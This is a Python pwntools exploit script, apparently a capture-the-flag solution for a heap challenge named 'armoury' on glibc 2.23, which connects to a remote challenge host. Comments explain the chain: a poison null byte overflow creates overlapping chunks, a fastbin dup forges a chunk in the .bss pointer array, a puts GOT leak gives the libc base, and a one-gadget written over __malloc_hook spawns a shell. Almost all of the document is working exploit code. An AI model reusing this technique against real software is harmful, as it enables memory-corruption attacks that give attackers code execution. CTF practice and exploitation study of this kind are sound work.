#!/usr/bin/env python3


#A classic pre-tcache heap note challenge with libc version 2.23
#From the source code and the program puts statements we know here that it is a null byte overflow challenge
#What can a faulty null byte can do..Pretty much everything because when the size bit is set 0.
#A non free space can be taken free and trick a consolidation by providing a fake prev size to create overlapping chunks
#Using house of einherjar method or only if ASCII strings are allowed maybe use the chris evans google poison null byte technique
#We are gonna go the easy way as this is not in the place here which is house of einherjar
#First let's create some chunks and overflow a chunk and then set its prev in use bit 0
#Only malloc size is allowed till 0x1ff
#So our overlapping chunk max size has to be under 0x1ff
#Now as chunks gets overlapped we have a 0x70 chunk in which we can tamper the fastbin fd to link a fake chunk
#But we need the leaks right to tamper the malloc hook here bcoz of presence of full relro here
#The problem here is the our input is read via fgets and the option to print leaks uses printf which stops at null 
#while fgets place null at the end so even after creating overlapping chunks we can't read via the overlapped free chunk
#And the other problem is that the binary only allows you to edit the chunk first time never afterwards
#Now everything seems lost right..Not at all..All the pointers for the chunk in the heap are placed in the .bss array.
#There is a 0x7f fake size field to link the 0x70 chunk there ..So first let's link a fake chunk in the .bss region 
#To tamper the chunk pointers and then change the value to a puts got array  to get the leak.
#And then use it to make a fastbin dup again using the overlapping chunk to tamper the malloc hook with a one gadget to get a shell



from pwn import *


e = ELF("./armoury_patched")
#r = process("./armoury_patched")
r = remote("gc1.eng.run",31190)
libc = ELF("./libc.so.6")

def malloc(size,data):
    r.sendafter(b">",b"1\n")
    r.sendafter(b"Size:",f"{size}\n")
    r.sendafter(b"Items:",data)
    r.recvuntil(b"Index ")
    index = int(r.recvline().strip())
    return index

def free(index):
    r.sendafter(b">",b"2\n")
    r.sendafter(b"Index:",f"{index}\n")


def read_leak(index):
    r.sendafter(b">",b"3\n")
    r.sendafter(b"Index:",f"{index}\n")
    r.recvuntil(b"You have bought:")
    leak = u64(r.recvuntil(b"\x7f").strip().decode('latin-1').ljust(8,'\x00'))
    return leak

chunk_A = malloc(0x98,b"A" * 8)
chunk_B = malloc(0x68,b"A" * 8)
chunk_C = malloc(0x68,b"A" * 8)
chunk_D = malloc(0xf8,b"A" * 8)
free(chunk_C)
chunk_C1 = malloc(0x68,b"A" * 0x60 + p64(0x180))              #Overflow with fake prev size field and null byte to tamper the prev in use bit
chunk_E = malloc(0x28,b"A" * 8)
free(chunk_C1)
free(chunk_B)
free(chunk_A)
free(chunk_D)
chunk_F = malloc(0x1f8,b"\x00" * 0x98 + p64(0x71) + p64(0x60202d))  #First fastbin dup process to link the pointer array  as a fake chunk
chunk_G = malloc(0x68,b"A" * 8)
free(chunk_F)
chunk_H = malloc(0x68,b"A" * 3 + b"\x98\x1f\x60")                   # Using this to get puts leak
libc_leak = read_leak(0)
libc_base = libc_leak - libc.sym["puts"]
log.info("The libc base of the process is " + hex(libc_base))
free(chunk_G)
chunk_H = malloc(0x1f8,b"/bin\sh\x00" + b"\x00" * 0x90 + p64(0x71) + p64(libc_base + libc.sym.__malloc_hook - 35))  #Fastbin dup to link malloc hook using 
chunk_I = malloc(0x68,b"\x00")  #puts leak to tamper it with one gadget and also the presence of fake size field 0x7f makes it a best choice to place here
chunk_J = malloc(0x68,b"\x00" * 19 + p64(libc_base + 0xf1247))           #One gadget placed
r.sendafter(b">",b"1\n")
r.sendafter(b"Size:",b"104\n")
r.interactive()
